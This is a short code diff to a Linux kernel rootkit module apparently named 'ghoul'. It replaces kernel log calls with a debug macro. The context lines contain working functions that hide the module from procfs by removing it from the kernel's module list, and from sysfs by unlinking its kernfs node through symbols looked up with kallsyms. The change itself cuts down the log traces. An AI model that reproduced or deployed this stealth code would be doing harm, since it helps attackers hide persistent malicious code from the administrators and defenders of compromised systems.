@@ -1,6 +1,7 @@
 #include <linux/module.h>
 #include <linux/slab.h>
 #include <linux/kallsyms.h>
+#include "ghoul.h"
 #include "load.h"
 #include "privileges.h"
 #include "hide.h"
@@ -14,7 +15,7 @@ __always_inline void hide_module_procfs(void)
     if (is_hidden_procfs)
         return;
     
-    pr_info("ghoul: hiding module from procfs\n");
+    debug("ghoul: hiding module from procfs\n");
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     is_hidden_procfs = 1;
@@ -25,7 +26,7 @@ __always_inline void show_module_procfs(void)
     if (!is_hidden_procfs)
         return;
     
-    pr_info("ghoul: showing module in procfs\n");
+    debug("ghoul: showing module in procfs\n");
     list_add(&THIS_MODULE->list, prev_module);
     is_hidden_procfs = 0;
 }
@@ -48,7 +49,7 @@ __always_inline void hide_module_sysfs(void)
     if (kernfs_unlink_sibling == NULL)
         kernfs_unlink_sibling = (void (*)(struct kernfs_node *kn))kallsyms_lookup_name("kernfs_unlink_sibling");
     
-    pr_info("ghoul: hiding module from sysfs\n");
+    debug("ghoul: hiding module from sysfs\n");
     kernfs_unlink_sibling(THIS_MODULE->mkobj.kobj.sd);
 
     is_hidden_sysfs = 1;
@@ -62,7 +63,7 @@ __always_inline void show_module_sysfs(void)
     if (kernfs_link_sibling == NULL)
         kernfs_link_sibling = (int (*)(struct kernfs_node *kn))kallsyms_lookup_name("kernfs_link_sibling");
     
-    pr_info("ghoul: showing module in sysfs\n");
+    debug("ghoul: showing module in sysfs\n");
     kernfs_link_sibling(THIS_MODULE->mkobj.kobj.sd);
 
     is_hidden_sysfs = 0;
